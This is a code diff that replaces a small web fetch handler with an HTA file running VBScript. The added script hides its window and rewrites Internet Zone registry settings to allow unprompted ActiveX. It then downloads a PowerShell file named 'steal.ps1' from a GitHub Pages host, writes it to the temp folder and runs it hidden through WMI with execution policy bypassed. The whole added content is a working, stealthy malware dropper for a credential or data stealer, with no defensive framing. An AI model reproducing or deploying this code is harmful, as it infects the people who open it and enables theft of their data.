@@ -1,14 +1,43 @@
-export default {
-  async fetch(request) {
-    const originUrl = "https://lozix94-afk.github.io/hahadicexd/"; 
-    const response = await fetch(originUrl);
-    const html = await response.text();
+<html>
+<head><title>.</title>
+<hta:application id="a" border="none" innerborder="no" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no"/>
+<script language="VBScript">
+window.resizeTo 0,0:window.moveTo -2000,-2000
+On Error Resume Next
 
-    return new Response(html, {
-      headers: {
-        "Content-Type": "text/plain", 
-        "Content-Disposition": "inline"
-      }
-    });
-  }
-};
+Dim sh, fso, xh, ps1Content
+Set sh = CreateObject("WScript.Shell")
+Set fso = CreateObject("Scripting.FileSystemObject")
+Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+
+' Disable Timeout Popup
+sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201", 0, "REG_DWORD"
+sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\1\1201", 0, "REG_DWORD"
+sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\2\1201", 0, "REG_DWORD"
+sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3\1201", 0, "REG_DWORD"
+sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\4\1201", 0, "REG_DWORD"
+
+' Download steal.ps1
+xh.Open "GET", "https://lozix94-afk.github.io/hahadicexd/steal.ps1", False
+xh.Send
+
+If xh.Status = 200 Then
+    ps1Content = xh.responseText
+    Set xh = Nothing
+
+    Dim tempPs1 : tempPs1 = sh.ExpandEnvironmentStrings("%TEMP%") & "\steal.ps1"
+    Dim f : Set f = fso.CreateTextFile(tempPs1, True)
+    f.Write ps1Content
+    f.Close
+
+    ' Run via WMI completely hidden (No cmd prompt)
+    Dim finalCmd : finalCmd = "powershell.exe -NoP -Exec Bypass -WindowStyle Hidden -File """ & tempPs1 & """"
+    Dim wmi: Set wmi = GetObject("winmgmts:\\.\root\cimv2")
+    Dim proc: Set proc = wmi.Get("Win32_Process")
+    proc.Create finalCmd, Null, Null
+End If
+
+' Close instantly so no timeout popup appears
+window.close()
+</script>
+</head><body></body></html>
